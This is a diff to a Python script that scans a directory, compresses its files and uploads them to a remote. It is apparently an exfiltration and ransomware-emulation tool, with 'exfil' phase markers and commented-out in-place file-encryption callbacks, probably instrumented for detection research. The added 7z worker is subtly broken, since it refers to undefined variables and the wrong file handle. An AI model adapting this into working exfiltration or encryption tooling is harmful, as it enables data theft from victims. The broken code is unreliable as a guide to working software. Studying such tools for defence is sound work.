@@ -11,11 +11,16 @@ import multiprocessing
 import io
 import zstandard as zstd
 from datetime import datetime
+import sys
 
-import sysmark
+current_dir = os.path.dirname(os.path.abspath(__file__))
+parent_dir = os.path.dirname(current_dir)
+sys.path.append(parent_dir)
+
+import marker as sysmark
 
 # ====== CONFIGURATION ======
-ARCHIVE_DIR = "archives"
+ARCHIVE_DIR = str(Path.home())+"/archives"
 stop_signal = object()
 # Ensure output dirs exist
 Path(ARCHIVE_DIR).mkdir(exist_ok=True)
@@ -47,6 +52,27 @@ def compress_gzip_worker(file_queue, thread_id, scan_path, barrier):
             file_queue.task_done()
     barrier.wait()
     file_queue.put(archive_path)
+    file_queue.put(stop_signal)
+
+def compress_7z_worker(file_queue, z7_threads, scan_path):
+    archive_path = os.path.join(ARCHIVE_DIR, "archive_0.7z")
+
+    with open(target_dir_list, "w") as file:
+        while True:
+            file_path = file_queue.get()
+            if file_path is stop_signal:
+                file_queue.task_done()
+                break
+            arcname = os.path.relpath(file_path, scan_path)
+            f.write(arcname)
+            file_queue.task_done()
+
+    thread_arg=f"-mmt={z7_threads}"
+    subprocess.run([
+        "7z","a" ,"-t7z" ,"-mx=9", thread_arg, archive_path, f"@{target_dir_list}"], check=True)
+    os.remove(target_dir_list)
+    file_queue.join()
+    file_queue.put(compressed_path)
     file_queue.put(stop_signal)
 
 def compress_zstd_worker_1(file_queue, zstd_threads, scan_path):
@@ -213,12 +239,24 @@ def main():
     compressor = args['compressor']
     THREADS = int(args['threads'])
     remote = args['remote']
-    pid = int(args['verbose'])
+    
+    try:    
+        mark_id = int(args['verbose'])
+    except ValueError:
+        mark_id = f"exfil_{compressor}_{THREADS}_{remote}_{args['verbose']}_phase"
+    
+    #match write_mode:
+    #    case "O":
+    #        callback = fio.encrypt_file_inplace
+    #    case "WA":
+    #        callback = fio.encrypt_file_writeafter
+    #    case "WB":
+    #        callback = fio.encrypt_file_writebefore
 
     file_queue = queue.Queue()                 # Shared queue for file paths
 
-    if pid>0:
-        sysmark.invoke_syscall(pid,1)
+    if mark_id != 0:
+        sysmark.invoke_marker(mark_id)
     
     print("[*] Scanning files...")
     if "zstd" in compressor:
@@ -227,21 +265,21 @@ def main():
         stops = THREADS
     run_scanner(directory, file_queue, THREADS, stops)
 
-    if pid>0:
-        sysmark.invoke_syscall(pid,1)
+    if mark_id != 0:
+        sysmark.invoke_marker(mark_id)
 
     if compressor != "none":
         print("[*] Compressing files...")
         run_compression(file_queue, THREADS, compressor, directory)
 
-    if pid>0:
-        sysmark.invoke_syscall(pid,1)
+    if mark_id != 0:
+        sysmark.invoke_marker(mark_id)
 
     print("[*] Uploading files...")
     run_uploader(file_queue, THREADS, remote)
 
-    if pid>0:
-        sysmark.invoke_syscall(pid,1)
+    if mark_id != 0:
+        sysmark.invoke_marker(mark_id)
 
     print("[✓] Done.")
 
